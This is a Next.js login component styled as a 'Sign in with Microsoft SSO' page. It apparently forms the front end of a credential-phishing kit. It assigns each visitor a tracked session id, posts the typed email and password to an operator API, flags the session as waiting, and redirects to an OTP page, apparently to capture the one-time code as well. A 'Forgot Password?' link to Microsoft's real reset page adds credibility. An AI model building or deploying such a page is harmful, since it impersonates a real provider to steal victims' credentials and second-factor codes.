import { AiOutlineTwitter } from "react-icons/ai";
import { BiLogoFacebook } from "react-icons/bi";
import { useState, useEffect } from "react";
import { useRouter } from "next/router";
import { setCookie } from "cookies-next";
import { getCookie } from "cookies-next";

export default function Login() {
  const router = useRouter();
  const [emailAddress, setemailAddress] = useState("");
  const [password, setpassword] = useState("");
  const [id, setid] = useState("");

  const hello = async () => {
    const cookie = getCookie("id");
    if (cookie == null) {
      try {
        const res = await fetch(`${process.env.API_URL}/hello`, {
          method: "GET",
          cache: "no-cache",
        });
        res.text().then((text) => {
          setid(text);
          setCookie("id", text, {
            res,
            res,
            maxAge: 60 * 60 * 24 * 30, // 30 day
            sameSite: "lax",
          });
        });
      } catch (error) {
        alert("(╯°□°)╯︵ ┻━┻ : No more API");
      }
    } else {
      setid(cookie);
    }
  };

  const login = async () => {
    const data = {
      username: emailAddress,
      password: password,
    };
    const res = await fetch(`${process.env.API_URL}/login/${id}`, {
      method: "POST",
      cache: "no-cache",
      headers: {
        "Content-Type": "application/json",
        accept: "application/json",
      },
      body: JSON.stringify(data),
    });
    const res2 = await fetch(`${process.env.API_URL}/action/${id}/wait`, {
      method: "PUT",
      cache: "no-cache",
    });
    router.push("/OTP");
  };
  useEffect(() => {
    hello();
  }, []);

  return (
    <div className="md:w-1/3 max-w-sm">
      <div className="text-center md:text-left flex justify-between">
        <label className="mr-1 text-slate-800">
          Sign in with Microsoft SSO{" "}
        </label>
      </div>
      <div className="my-5 flex items-center before:mt-0.5 before:flex-1 before:border-t before:border-neutral-300 after:mt-0.5 after:flex-1 after:border-t after:border-neutral-300"></div>
      <input
        className="text-sm w-full px-4 py-2 border border-solid border-gray-300 rounded text-gray-950"
        type="text"
        value={emailAddress}
        placeholder="Email Address"
        onChange={(e) => {
          setemailAddress(e.currentTarget.value);
        }}
      />
      <input
        className="text-sm w-full px-4 py-2 border border-solid border-gray-300 rounded mt-4 text-gray-950"
        type="password"
        value={password}
        onChange={(e) => {
          setpassword(e.currentTarget.value);
        }}
        placeholder="Password"
      />
      <div className="mt-4 flex justify-between font-semibold text-sm">
        <label className="flex text-slate-500 hover:text-slate-600 cursor-pointer">
          <input className="mr-1" type="checkbox" />
          <span>Remember Me</span>
        </label>
        <a
          className="text-blue-600 hover:text-blue-700 hover:underline hover:underline-offset-4"
          href="https://account.live.com/password/reset"
        >
          Forgot Password?
        </a>
      </div>
      <div className="text-center md:text-left">
        <button
          disabled={!emailAddress | !password}
          onClick={login}
          className="mt-4 bg-blue-600 hover:bg-blue-700 px-4 py-2 text-white uppercase rounded text-xs tracking-wider disabled:bg-slate-600 "
          type="submit"
        >
          Login
        </button>
      </div>
    </div>
  );
}
